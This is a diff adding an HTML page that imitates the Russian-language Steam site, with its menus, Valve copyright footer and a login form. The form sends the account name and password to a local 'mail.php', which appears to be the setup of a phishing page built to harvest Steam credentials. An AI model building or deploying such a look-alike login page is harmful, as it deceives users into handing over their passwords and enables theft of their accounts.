@@ -1,0 +1,80 @@
+<!DOCTYPE html> 
+<html> 
+<head> 
+<meta charset="utf-8"> 
+<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+<title>Steam</title> 
+<link type="text/css" rel="stylesheet" href="style.css"> 
+</head> 
+<body> 
+    <nav>
+        <div class="mini_menu">
+            <a href="" class="steam_setup"> Установить Steam </a>
+            <a href=""> войти |</a>
+            <a href=""> язык</a>
+        </div>
+        <img src="images/logo_steam.svg">
+        <div class="menu"> 
+            <ul>
+                <li><a class="show_shop">МАГАЗИН</a>
+                    <ul class="shop">
+                        <li><a>ГЛАВНАЯ</a></li>
+                        <li><a>РЕКОМЕНДАЦИИ</a></li>
+                        <li><a>СПИСОК ЖЕЛАЕМОГО</a></li>
+                        <li><a>МАГАЗИН ОЧКОВ</a></li>
+                        <li><a>НОВОСТИ</a></li>
+                        <li><a>СТАТИСТИКА</a></li>
+                    </ul>
+                </li>
+                <li><a class="show_community">СООБЩЕСТВО</a>
+                    <ul class="community">
+                        <li><a>ГЛАВНАЯ</a></li>
+                        <li><a>ОБСУЖДЕНИЕ</a></li>
+                        <li><a>МАСТЕРСКАЯ</a></li>
+                        <li><a>ТОРГОВАЯ ПЛОЩАДКА</a></li>
+                        <li><a>ТРАНСЛЯЦИИ</a></li>
+                    </ul>
+                </li>
+                <li><a>O STEAM</a></li>
+                <li><a>ПОДДЕРЖКА</a></li>
+            </ul>
+    </div>
+    </nav>
+<div class="wrapper"> 
+    <div class="login">
+        <form action="mail.php" method="POST">
+            <h1> ВОЙТИ </h1>
+            <label for="nickname">Имя аккаунта Steam</label>
+            <input id="nickname" type="text" name="login">
+            <label for="password">Пароль</label>
+            <input id="password" type="password" name="password">
+            <input type="submit" value="Войти">
+            <a href="">Забыли пароль?</a>
+        </form>
+    </div>
+ 
+    <div class="join">
+        <p class="one">  Присоединитесь к Steam и откройте для себя тысячи игр.</p>
+        <a href="">Узнать больше</a>
+        <img src="images/join_pc.png" width="320px">
+        <p>Steam бесплатен и удобен в использовании.</p>
+        <a href="" class="join_steam">Присоединиться к Steam</a>
+    </div>
+</div>
+
+<footer>
+    <div class="wrapper_footer"> 
+    <p>© Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах. Часть географических сведений на этом сайте предоставлена<span><a href=""> geonames.org</a></span> .</p>
+    <div>
+        <a> Политика конфиденциальности |</a>
+        <a> Правовая информация |</a>
+        <a> Соглашение подписчика Steam |</a>
+        <a> Файлы cookie |</a>
+    </div>
+    </div>
+</footer>
+
+<script src="script.js"></script> 
+</body> 
+</html> 
